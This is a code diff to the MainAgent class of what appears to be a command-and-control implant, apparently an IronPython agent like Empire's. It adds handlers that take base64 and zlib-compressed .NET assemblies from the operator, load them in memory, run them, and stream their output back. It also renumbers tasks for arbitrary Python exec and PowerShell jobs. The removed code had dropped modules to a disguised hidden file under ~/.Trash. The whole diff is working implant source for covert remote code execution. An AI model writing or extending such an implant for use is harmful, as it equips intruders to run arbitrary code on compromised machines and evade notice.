@@ -429,7 +429,8 @@ class MainAgent:
         if len(self.tasks) > 0:
             try:
                 for x in self.tasks:
-                    self.tasks[x]['thread'].kill()
+                    self.tasks[x]['task_thread'].kill()
+                    self.tasks[x]['reading_thread'].kill()
             except:
                 # die hard if thread kill fails
                 pass
@@ -582,98 +583,334 @@ class MainAgent:
         self.packet_handler.send_message(self.packet_handler.build_response_packet(43, result_data, result_id))
         self.tasks[result_id]["status"] = "completed"
 
-    def csharp_execute(self, data, result_id):
-        """
-        Execute C# module in ironpython using reflection
-        Task 44
-        """
-        # todo: make this a job a thread to be trackable
+    def csharp_execute_wait(self, data, result_id):
         try:
-            import time
+            import base64
             import zlib
+            import time
+            import clr
+            import System.IO
+            from System import Array, Byte, Console, Object, String, Text, Char
+            from System.IO import Compression, MemoryStream, StreamWriter
+            from System.Reflection import Assembly
+            from System.Text import Encoding
+            from threading import Thread
 
+            clr.AddReference("System.Core")
+            import System.IO.Pipes
+
+            parts = data.split(",")
+
+            base64_string = ''.join(parts[1:])
+            json_string = base64.b64decode(base64_string).decode("utf-8")
+            json_object = json.loads(json_string)
+            command_array = Array[String]([str(value) for value in json_object.values()])
+
+            data_bytes = base64.b64decode(parts[0])
+
+            # Decompress the data and load the assembly
+            decoded_data = zlib.decompress(data_bytes, -15)
+            assem_bytes = Array[Byte](decoded_data)
+            assembly = Assembly.Load(assem_bytes)
+
+            # Get Program type and OutputStream property
+            program_type = assembly.GetType("Program")
+            output_stream_prop = program_type.GetProperty("OutputStream")
+
+            # Redirect OutputStream to a pipe for real-time streaming
+            if output_stream_prop:
+                # Initialize pipes for streaming
+                pipe_server_stream = System.IO.Pipes.AnonymousPipeServerStream(
+                    System.IO.Pipes.PipeDirection.In,
+                    System.IO.HandleInheritability.Inheritable
+                )
+                pipe_client_stream = System.IO.Pipes.AnonymousPipeClientStream(
+                    System.IO.Pipes.PipeDirection.Out,
+                    pipe_server_stream.GetClientHandleAsString()
+                )
+                stream_reader = System.IO.StreamReader(pipe_server_stream)
+
+                # Function to execute the main assembly method in a separate thread
+                def execute_main_method():
+                    # Create a StreamWriter for the pipe client stream to capture console output
+                    stream_writer = StreamWriter(pipe_client_stream)
+                    stream_writer.AutoFlush = True
+                    original_console_out = Console.Out  # Save the original Console.Out to restore later
+
+                    output_stream_prop.SetValue(None, pipe_client_stream, None)
+
+                    try:
+                        Console.SetOut(stream_writer)
+
+                        # Execute the Main method, which now writes to the redirected console
+                        main_method = program_type.GetMethod("Main")
+                        main_method.Invoke(None, Array[Object]([command_array]))
+
+                    except Exception as e:
+                        # Invocation error happening here but doesnt break anything
+                        pass
+
+                    finally:
+                        # Restore the original Console.Out
+                        Console.SetOut(original_console_out)
+
+                        # Dispose of the pipe client stream to close the connection
+                        if pipe_client_stream:
+                            pipe_client_stream.Dispose()
+
+                # Start the main method execution in a background thread
+                task_thread = KThread(target=execute_main_method)
+                task_thread.start()
+
+                # Function to read and send output data continuously
+                def read_output_stream():
+                    # Use Array[Byte] for binary data reading
+                    read_buffer = Array.CreateInstance(Char, 1024)
+                    output = ""
+
+                    while True:
+                        read_count = stream_reader.Read(read_buffer, 0, read_buffer.Length)
+                        if read_count == 0:
+                            break
+
+                        # Convert the byte buffer to a string and build response packet
+                        output_chunk = bytes(read_buffer[:read_count]).decode("utf-8")
+
+                        if output_chunk != "" or output_chunk is not None:
+                            output += output_chunk
+                            result_packet = self.packet_handler.build_response_packet(120, output, result_id)
+                            self.packet_handler.process_job_tasking(result_packet)
+                        time.sleep(0.1)
+
+                    self.tasks[result_id]["status"] = "completed"
+
+                # Start reading the output in another thread
+                reading_thread = KThread(target=read_output_stream)
+                reading_thread.start()
+
+                # Track task status and threads
+                self.tasks[result_id] = {
+                    "thread": task_thread,
+                    "reading_thread": reading_thread,
+                    "status": "running"
+                }
+
+            else:
+                # If no OutputStream, run the assembly method directly and wait for completion
+                from System.IO import StringWriter
+                from System import Console
+
+                # If no OutputStream, run the assembly method directly and capture console output
+                def no_stream_execute():
+                    try:
+                        # Redirect Console.Out to capture output
+                        string_writer = StringWriter()
+                        original_console_out = Console.Out
+                        Console.SetOut(string_writer)
+
+                        try:
+                            main_method = program_type.GetMethod("Main")
+                            main_method.Invoke(None, Array[Object]([command_array]))
+                        finally:
+                            Console.SetOut(original_console_out)
+
+                        # Get the captured output
+                        result = string_writer.ToString()
+
+                        # Send the result after execution completes
+                        if result:
+                            result_packet = self.packet_handler.build_response_packet(120, result, result_id)
+                            self.packet_handler.process_job_tasking(result_packet)
+                        self.tasks[result_id]["status"] = "completed"
+                    except Exception as e:
+                        error_message = "[!] Error while executing task: %s" % str(e)
+                        result_packet = self.packet_handler.build_response_packet(0, error_message, result_id)
+                        self.packet_handler.process_job_tasking(result_packet)
+                        self.tasks[result_id]["status"] = "error"
+
+                # Run in a separate thread for consistency
+                task_thread = Thread(target=no_stream_execute)
+                task_thread.start()
+
+                # Track task status
+                self.tasks[result_id] = {
+                    "thread": task_thread,
+                    "status": "running"
+                }
+
+        except Exception as e:
+            result_packet = self.packet_handler.build_response_packet(0,
+                                                                      "[!] Error while executing assembly: %s" % str(e),
+                                                                      result_id)
+            self.packet_handler.process_job_tasking(result_packet)
+            if result_id in self.tasks:
+                self.tasks[result_id]["status"] = "error"
+
+
+    # Task 122: Execute C# Assembly in Background, Stream Output Continuously
+    def csharp_background_job(self, data, result_id):
+        try:
+            import base64
+            import zlib
+            import time
             import clr
             import System.IO
             from System import Array, Byte, Char, Console, Object, String, Text
             from System.IO import Compression, MemoryStream, StreamWriter
             from System.Reflection import Assembly
             from System.Text import Encoding
+            from threading import Thread
+
+            clr.AddReference("System.Core")
+            import System.IO.Pipes
 
             parts = data.split(",")
-            params = Array[Object](parts[1:len(parts)])
+
+            base64_string = ''.join(parts[1:])
+            json_string = base64.b64decode(base64_string).decode("utf-8")
+            json_object = json.loads(json_string)
+            command_array = Array[String]([str(value) for value in json_object.values()])
+
             data_bytes = base64.b64decode(parts[0])
 
+            # Decompress the data and load the assembly
             decoded_data = zlib.decompress(data_bytes, -15)
-            assemBytes = Array[Byte](decoded_data)
-            assembly = Assembly.Load(assemBytes)
+            assem_bytes = Array[Byte](decoded_data)
+            assembly = Assembly.Load(assem_bytes)
 
-            strmprop = assembly.GetType("Task").GetProperty("OutputStream")
-            if not strmprop:
-                results = (
-                    assembly.GetType("Task").GetMethod("Execute").Invoke(None, params)
+            # Get Program type and OutputStream property
+            program_type = assembly.GetType("Program")
+            output_stream_prop = program_type.GetProperty("OutputStream")
+
+            # Handle OutputStream with pipes for continuous streaming
+            if output_stream_prop:
+                # Initialize pipe streams for inter-process communication
+                pipe_server_stream = System.IO.Pipes.AnonymousPipeServerStream(
+                    System.IO.Pipes.PipeDirection.In,
+                    System.IO.HandleInheritability.Inheritable
                 )
-                result_packet = self.packet_handler.build_response_packet(110, str(results), result_id)
-                self.packet_handler.process_job_tasking(result_packet)
+                pipe_client_stream = System.IO.Pipes.AnonymousPipeClientStream(
+                    System.IO.Pipes.PipeDirection.Out,
+                    pipe_server_stream.GetClientHandleAsString()
+                )
+                stream_reader = System.IO.StreamReader(pipe_server_stream)
+
+                # Function to execute the main assembly method in a background thread
+                def execute_main_method():
+                    # Create a StreamWriter for the pipe client stream to capture console output
+                    stream_writer = StreamWriter(pipe_client_stream)
+                    stream_writer.AutoFlush = True
+                    original_console_out = Console.Out  # Save the original Console.Out to restore later
+
+                    output_stream_prop.SetValue(None, pipe_client_stream, None)
+
+                    try:
+                        Console.SetOut(stream_writer)
+
+                        # Execute the Main method, which now writes to the redirected console
+                        main_method = program_type.GetMethod("Main")
+                        main_method.Invoke(None, Array[Object]([command_array]))
+
+                    except Exception as e:
+                        # Invocation error happening here but doesnt break anything
+                        pass
+
+                    finally:
+                        # Restore the original Console.Out
+                        Console.SetOut(original_console_out)
+
+                        # Dispose of the pipe client stream to close the connection
+                        if pipe_client_stream:
+                            pipe_client_stream.Dispose()
+
+                # Start the main method execution in a background thread
+                task_thread = KThread(target=execute_main_method)
+                task_thread.start()
+
+                # Function to read and send output data continuously
+                def read_output_stream():
+                    # Use Array[Byte] for binary data reading
+                    read_buffer = Array.CreateInstance(Char, 1024)
+                    output = ""
+
+                    while True:
+                        read_count = stream_reader.Read(read_buffer, 0, read_buffer.Length)
+                        if read_count == 0:
+                            break
+
+                        # Convert the byte buffer to a string and build response packet
+                        output_chunk = bytes(read_buffer[:read_count]).decode("utf-8")
+
+                        if output_chunk != "" or output_chunk is not None:
+                            output += output_chunk
+                            result_packet = self.packet_handler.build_response_packet(120, output, result_id)
+                            self.packet_handler.process_job_tasking(result_packet)
+                        time.sleep(0.1)
+
+                    self.tasks[result_id]["status"] = "completed"
+
+                # Start reading the output in another thread
+                reading_thread = KThread(target=read_output_stream)
+                reading_thread.start()
+
+                # Track task status and threads
+                self.tasks[result_id] = {
+                    "thread": task_thread,
+                    "reading_thread": reading_thread,
+                    "status": "running"
+                }
 
             else:
+                # If no OutputStream, run the assembly method directly and wait for completion
+                from System.IO import StringWriter
+                from System import Console
 
-                def csharp_job_func(decoded_data, params, pipeClientStream):
-                    assemBytes = Array[Byte](decoded_data)
-                    assembly = Assembly.Load(assemBytes)
+                # If no OutputStream, run the assembly method directly and capture console output
+                def no_stream_execute():
+                    try:
+                        # Redirect Console.Out to capture output
+                        string_writer = StringWriter()
+                        original_console_out = Console.Out
+                        Console.SetOut(string_writer)
 
-                    strmprop = assembly.GetType("Task").GetProperty("OutputStream")
-                    strmprop.SetValue(None, pipeClientStream, None)
-                    assembly.GetType("Task").GetMethod("Execute").Invoke(
-                        None, params
-                    )
-                    pipeClientStream.Dispose()
+                        try:
+                            main_method = program_type.GetMethod("Main")
+                            main_method.Invoke(None, Array[Object]([command_array]))
+                        finally:
+                            Console.SetOut(original_console_out)
 
-                clr.AddReference("System.Core")
-                import System.IO.HandleInheritability
-                import System.IO.Pipes
+                        # Get the captured output
+                        result = string_writer.ToString()
 
-                pipeServerStream = System.IO.Pipes.AnonymousPipeServerStream(
-                    System.IO.Pipes.PipeDirection.In,
-                    System.IO.HandleInheritability.Inheritable,
-                )
-                pipeClientStream = System.IO.Pipes.AnonymousPipeClientStream(
-                    System.IO.Pipes.PipeDirection.Out,
-                    pipeServerStream.GetClientHandleAsString(),
-                )
-                streamReader = System.IO.StreamReader(pipeServerStream)
+                        # Send the result after execution completes
+                        if result:
+                            result_packet = self.packet_handler.build_response_packet(120, result, result_id)
+                            self.packet_handler.process_job_tasking(result_packet)
+                        self.tasks[result_id]["status"] = "completed"
+                    except Exception as e:
+                        error_message = "[!] Error while executing task: %s" % str(e)
+                        result_packet = self.packet_handler.build_response_packet(0, error_message, result_id)
+                        self.packet_handler.process_job_tasking(result_packet)
+                        self.tasks[result_id]["status"] = "error"
 
-                task_thread = KThread(
-                    target=csharp_job_func,
-                    args=(
-                        decoded_data,
-                        params,
-                        pipeClientStream,
-                    ),
-                )
-
-                pipeOutput = Text.StringBuilder()
-                read = Array[Char](pipeServerStream.InBufferSize)
-
+                # Run in a separate thread for consistency
+                task_thread = Thread(target=no_stream_execute)
                 task_thread.start()
-                count = 1
-                while count > 0:
-                    time.sleep(1)
-                    count = streamReader.Read(read, 0, read.Length)
-                    stream_text = read[0:count]
-                    pipeOutput.Append(stream_text)
 
-                result_packet = self.packet_handler.build_response_packet(110, str(pipeOutput), result_id)
-                self.packet_handler.process_job_tasking(result_packet)
-
-            self.tasks[result_id]["status"] = "completed"
+                # Track task status
+                self.tasks[result_id] = {
+                    "thread": task_thread,
+                    "status": "running"
+                }
 
         except Exception as e:
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    0, "error executing specified Python data %s " % (e), result_id
-                )
-            )
-            self.tasks[result_id]["status"] = "error"
+            result_packet = self.packet_handler.build_response_packet(0,
+                                                                      "[!] Error while executing assembly: %s" % str(e),
+                                                                      result_id)
+            self.packet_handler.process_job_tasking(result_packet)
+            if result_id in self.tasks:
+                self.tasks[result_id]["status"] = "error"
+
 
     def task_list(self, result_id):
         """
@@ -710,14 +947,16 @@ class MainAgent:
         Task 51
         """
         try:
-            if self.tasks[job_to_kill]['thread'].is_alive():
-                self.tasks[job_to_kill]['thread'].kill()
+            if self.tasks[job_to_kill]['task_thread'].is_alive():
+                self.tasks[job_to_kill]['task_thread'].kill()
                 self.tasks[job_to_kill]['status'] = "stopped"
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
                         51, "[+] Job thread %s stopped successfully" % (job_to_kill), result_id
                     )
                 )
+                if self.tasks[job_to_kill]['reading_thread'].is_alive():
+                    self.tasks[job_to_kill]['reading_thread'].kill()
             else:
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
@@ -744,15 +983,15 @@ class MainAgent:
         if not self.socksthread:
             try:
                 self.socksqueue = Queue.Queue()
-                self.tasks[result_id]['thread'] = KThread(
+                self.tasks[result_id]['task_thread'] = KThread(
                     target=Server,
                     args=(
                         self.socksqueue,
                         result_id,
                     ),
                 )
-                self.tasks[result_id]['thread'].daemon = True
-                self.tasks[result_id]['thread'].start()
+                self.tasks[result_id]['task_thread'].daemon = True
+                self.tasks[result_id]['task_thread'].start()
                 self.socksthread = True
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
@@ -857,7 +1096,7 @@ class MainAgent:
     def dynamic_code_execute_wait_nosave(self, data, result_id):
         """
         Execute dynamic code and wait for the results without saving output.
-        Task 100
+        Task 110
         """
         try:
             buffer = StringIO()
@@ -866,13 +1105,13 @@ class MainAgent:
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             results = buffer.getvalue()
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(100, str(results), result_id))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(110, str(results), result_id))
             self.tasks[result_id]["status"] = "completed"
         except Exception as e:
             errorData = str(buffer.getvalue())
             self.packet_handler.build_response_packet(
                 0,
-                "error executing specified Python data: %s \nBuffer data recovered:\n%s"
+                "error executing TASK_PYTHON_CMD_WAIT: %s \nBuffer data recovered:\n%s"
                 % (e, errorData),
                 result_id,
             )
@@ -881,7 +1120,7 @@ class MainAgent:
     def dynamic_code_execution_wait_save(self, data, result_id):
         """
         Execute dynamic code and wait for the results while saving output.
-        Task 101
+        Task 111
         """
         prefix = data[0:15].strip()
         extension = data[15:20].strip()
@@ -900,7 +1139,7 @@ class MainAgent:
             encodedPart = base64.b64encode(encodedPart).decode("UTF-8")
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    101,
+                    111,
                     "{0: <15}".format(prefix)
                     + "{0: <5}".format(extension)
                     + encodedPart,
@@ -915,7 +1154,7 @@ class MainAgent:
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
                     0,
-                    "error executing specified Python data %s \nBuffer data recovered:\n%s"
+                    "error executing TASK_PYTHON_CMD_WAIT_SAVE %s \nBuffer data recovered:\n%s"
                     % (e, errorData),
                     result_id,
                 )
@@ -924,60 +1163,63 @@ class MainAgent:
 
     def disk_code_execution_wait_save(self, data, result_id):
         """
-        Execute on disk code and wait for the results while saving output.
-        For modules that require multiprocessing not supported by exec
-        Task 110
+        Execute on-disk code and wait for the results while saving output.
+        Adjusted for Windows and cross-platform compatibility.
+        Task 112
         """
-        # todo: is this used?
         try:
-            implantHome = expanduser("~") + "/.Trash/"
-            moduleName = ".mac-debug-data"
-            implantPath = implantHome + moduleName
-            result = "[*] Module disk path: %s \n" % (implantPath)
-            with open(implantPath, "w") as f:
-                f.write(data)
-            result += "[*] Module properly dropped to disk \n"
-            pythonCommand = "python %s" % (implantPath)
-            process = subprocess.Popen(
-                pythonCommand, stdout=subprocess.PIPE, shell=True
-            )
-            data = process.communicate()
-            result += data[0].strip()
+            script_globals = {}
+            output_capture = io.StringIO()
+            sys.stdout = output_capture
+
             try:
-                os.remove(implantPath)
-                result += "[*] Module path was properly removed: %s" % (implantPath)
-            except Exception as e:
-                print("error removing module filed: %s" % (e))
-            fileCheck = os.path.isfile(implantPath)
-            if fileCheck:
-                result += "\n\nError removing module file, please verify path: " + str(
-                    implantPath
+                exec(data, script_globals)
+            except SyntaxError as e:
+                result = "[!] Syntax error in script: %s on line %d - %s" % (str(e), e.lineno, e.text)
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(0, result, result_id)
                 )
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(100, str(result), result_id))
+                self.tasks[result_id]["status"] = "error"
+                return
+
+            except Exception as e:
+                result = "[!] Error executing script: %s" % str(e)
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(0, result, result_id)
+                )
+                self.tasks[result_id]["status"] = "error"
+                return
+
+            captured_output = output_capture.getvalue()
+
+            if captured_output:
+                result = "[*] Output from script:\n" + captured_output
+            else:
+                result = "[*] No output captured from the script.\n"
+
+            if 'output' in script_globals:
+                result += "[*] Output variable from script: \n" + str(script_globals['output'])
+
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(112, result, result_id)
+            )
             self.tasks[result_id]["status"] = "completed"
 
         except Exception as e:
-            fileCheck = os.path.isfile(implantPath)
-            if fileCheck:
-                self.packet_handler.send_message(
-                    self.packet_handler.build_response_packet(
-                        0,
-                        "error executing specified Python data: %s \nError removing module file, please verify path: %s"
-                        % (e, implantPath),
-                        result_id,
-                    )
-                )
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    0, "error executing specified Python data: %s" % (e), result_id
+                    0, "error executing TASK_PYTHON_CMD_JOB: %s" % (e), result_id
                 )
             )
             self.tasks[result_id]["status"] = "error"
 
+        finally:
+            sys.stdout = sys.__stdout__
+
     def powershell_task(self, data, result_id):
         """
         Execute a PowerShell command.
-        Task 112
+        Task 102
         """
         from System import AppDomain
         clr.AddReference("System.Management.Automation")
@@ -1009,12 +1251,12 @@ class MainAgent:
 
         self.tasks[result_id] = {'app_domain': app_domain,
                                'ps_host': ps_host,
-                               'thread': thread,
+                               'task_thread': thread,
                                'buffer': buffer,
                                'ps_host_exec': ps_host_exec
                                  }
 
-        result_packet = self.packet_handler.build_response_packet(110, "Job Started: %s" % (result_id), result_id)
+        result_packet = self.packet_handler.build_response_packet(102, "Job Started: %s" % (result_id), result_id)
         self.packet_handler.process_job_tasking(result_packet)
         self.tasks[result_id]["status"] = "running"
 
@@ -1022,7 +1264,7 @@ class MainAgent:
         buffer = sender
         index = event_args.Index
         item = buffer[index]
-        result_packet = self.packet_handler.build_response_packet(110, str(item), result_id)
+        result_packet = self.packet_handler.build_response_packet(102, str(item), result_id)
         self.packet_handler.process_job_tasking(result_packet)
 
     def wait_for_powershell_job(self, result_id):
@@ -1047,7 +1289,7 @@ class MainAgent:
     def powershell_task_dyanmic_code_wait_nosave(self, data, result_id):
         """
         Execute a PowerShell command and wait for the results without saving output.
-        Task 118
+        Task 100
         """
         try:
             data = data.lstrip("\x00")
@@ -1062,7 +1304,7 @@ class MainAgent:
             for result in results:
                 print(result)
 
-            result_packet = self.packet_handler.build_response_packet(110, str(result), result_id)
+            result_packet = self.packet_handler.build_response_packet(100, str(result), result_id)
             self.packet_handler.process_job_tasking(result_packet)
             self.tasks[result_id]["status"] = "completed"
 
@@ -1070,134 +1312,7 @@ class MainAgent:
             print(e)
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    0, "error executing specified Python data %s " % (e), result_id
-                )
-            )
-            self.tasks[result_id]["status"] = "error"
-
-    def script_command(self, data, result_id):
-        """
-        Execute a base64 encoded script.
-        Task 121
-        """
-        script = base64.b64decode(data)
-        try:
-            buffer = StringIO()
-            sys.stdout = buffer
-            code_obj = compile(script, "<string>", "exec")
-            exec(code_obj, globals())
-            sys.stdout = sys.__stdout__
-            result = str(buffer.getvalue())
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(121, result, result_id))
-            self.tasks[result_id]["status"] = "completed"
-
-        except Exception as e:
-            errorData = str(buffer.getvalue())
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    0,
-                    "error executing specified Python data %s \nBuffer data recovered:\n%s"
-                    % (e, errorData),
-                    result_id,
-                )
-            )
-            self.tasks[result_id]["status"] = "error"
-
-    def script_load(self, data, result_id):
-        """
-        Load a script into memory.
-        Task 122
-        """
-        try:
-            parts = data.split("|")
-            base64part = parts[1]
-            fileName = parts[0]
-            raw = base64.b64decode(base64part)
-            d = decompress()
-            dec_data = d.dec_data(raw, cheader=True)
-            if not dec_data["crc32_check"]:
-                self.packet_handler.send_message(
-                    self.packet_handler.build_response_packet(
-                        122, "Failed crc32_check during decompression", result_id
-                    )
-                )
-                self.tasks[result_id]["status"] = "error"
-
-        except Exception as e:
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    122, "Unable to decompress zip file: %s" % (e), result_id
-                )
-            )
-            self.tasks[result_id]["status"] = "error"
-
-        zdata = dec_data["data"]
-        zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
-        if fileName in list(moduleRepo.keys()):
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    122, "%s module already exists" % (fileName), result_id
-                )
-            )
-            self.tasks[result_id]["status"] = "error"
-
-        else:
-            moduleRepo[fileName] = zf
-            self.install_hook(fileName)
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    122, "Successfully imported %s" % (fileName), result_id
-                )
-            )
-            self.tasks[result_id]["status"] = "completed"
-
-    def view_loaded_modules(self, data, result_id):
-        """
-        View loaded modules.
-        Task 123
-        """
-        # view loaded modules
-        repoName = data
-        if repoName == "":
-            loadedModules = "\nAll Repos\n"
-            for key, value in list(moduleRepo.items()):
-                loadedModules += "\n----" + key + "----\n"
-                loadedModules += "\n".join(moduleRepo[key].namelist())
-
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(123, loadedModules, result_id))
-            self.tasks[result_id]["status"] = "completed"
-
-        else:
-            try:
-                loadedModules = "\n----" + repoName + "----\n"
-                loadedModules += "\n".join(moduleRepo[repoName].namelist())
-                self.packet_handler.send_message(self.packet_handler.build_response_packet(123, loadedModules, result_id))
-                self.tasks[result_id]["status"] = "completed"
-
-            except Exception as e:
-                msg = "Unable to retrieve repo contents: %s" % (str(e))
-                self.packet_handler.send_message(self.packet_handler.build_response_packet(123, msg, result_id))
-                self.tasks[result_id]["status"] = "error"
-
-    def remove_module(self, data, result_id):
-        """
-        Remove a module.
-        """
-        repoName = data
-        try:
-            self.remove_hook(repoName)
-            del moduleRepo[repoName]
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    124, "Successfully remove repo: %s" % (repoName), result_id
-                )
-            )
-            self.tasks[result_id]["status"] = "completed"
-
-        except Exception as e:
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    124, "Unable to remove repo: %s, %s" % (repoName, str(e)), result_id
+                    0, "error executing TASK_POWERSHELL_CMD_WAIT %s " % (e), result_id
                 )
             )
             self.tasks[result_id]["status"] = "error"
@@ -1217,7 +1332,7 @@ class MainAgent:
         code_thread = KThread(target=self.python_job_func, args=(result_id,))
         code_thread.start()
 
-        self.tasks[result_id]['thread'] = code_thread
+        self.tasks[result_id]['task_thread'] = code_thread
         self.tasks[result_id]["status"] = "running"
 
     def python_job_func(self, result_id):
@@ -1244,7 +1359,7 @@ class MainAgent:
         try:
             self.job_message_buffer += str(message)
         except Exception as e:
-            print(e)
+            print("[!] Error adding job output to buffer: %s" % (e))
 
     def get_job_message_buffer(self):
         try:
@@ -1529,7 +1644,8 @@ class MainAgent:
                     "result_id": result_id,
                     "packet_type": packet_type,
                     "status": "started",
-                    "thread": None,
+                    "task_thread": None,
+                    "reading_thread": None,
                     "language": None,
                     "powershell":
                         {
@@ -1551,11 +1667,6 @@ class MainAgent:
                 self.packet_handler.send_message(self.packet_handler.build_response_packet(2, "", result_id))
                 self.agent_exit()
 
-            elif packet_type == 34:
-                # TASK_SET_PROXY
-                self.tasks[result_id]["status"] = "unimplemented"
-                pass
-
             elif packet_type == 40:
                 self.run_prebuilt_command(data, result_id)
 
@@ -1567,9 +1678,6 @@ class MainAgent:
 
             elif packet_type == 43:
                 self.directory_list(data, result_id)
-
-            elif packet_type == 44:
-                self.csharp_execute(data, result_id)
 
             elif packet_type == 50:
                 self.task_list(result_id)
@@ -1584,45 +1692,33 @@ class MainAgent:
                 self.start_smb_pipe_server(data, result_id)
 
             elif packet_type == 100:
-                self.dynamic_code_execute_wait_nosave(data, result_id)
-
-            elif packet_type == 101:
-                self.dynamic_code_execution_wait_save(data, result_id)
-
-            elif packet_type == 102:
-                self.disk_code_execution_wait_save(data, result_id)
-
-            elif packet_type == 110:
-                self.start_python_job(data, result_id)
-
-            elif packet_type == 111:
-                # TASK_CMD_JOB_SAVE
-                self.tasks[result_id]["status"] = "unimplemented"
-                pass
-
-            elif packet_type == 112:
-                self.powershell_task(data, result_id)
-
-            elif packet_type == 118:
                 self.powershell_task_dyanmic_code_wait_nosave(data, result_id)
 
-            elif packet_type == 119:
+            elif packet_type == 101:
                 self.tasks[result_id]["status"] = "unimplemented"
-                pass
 
-            elif packet_type == 121:
-                self.script_command(data, result_id)
+            elif packet_type == 102:
+                self.powershell_task(data, result_id)
+
+            elif packet_type == 110:
+                self.dynamic_code_execute_wait_nosave(data, result_id)
+
+            elif packet_type == 111:
+                self.dynamic_code_execution_wait_save(data, result_id)
+
+            elif packet_type == 112:
+                self.disk_code_execution_wait_save(data, result_id)
+
+            elif packet_type == 113:
+                self.start_python_job(data, result_id)
+
+            elif packet_type == 120:
+                self.csharp_execute_wait(data, result_id)
 
             elif packet_type == 122:
-                self.script_load(data, result_id)
+                self.csharp_background_job(data, result_id)
 
-            elif packet_type == 123:
-                self.view_loaded_modules(data, result_id)
-
-            elif packet_type == 124:
-                self.remove_module(data, result_id)
-
-            elif packet_type == 130:
+            elif packet_type == 220:
                 # Dynamically update agent comms
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
@@ -1631,7 +1727,7 @@ class MainAgent:
                 )
                 self.tasks[result_id]["status"] = "unimplemented"
 
-            elif packet_type == 131:
+            elif packet_type == 221:
                 # Update the listener name variable
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
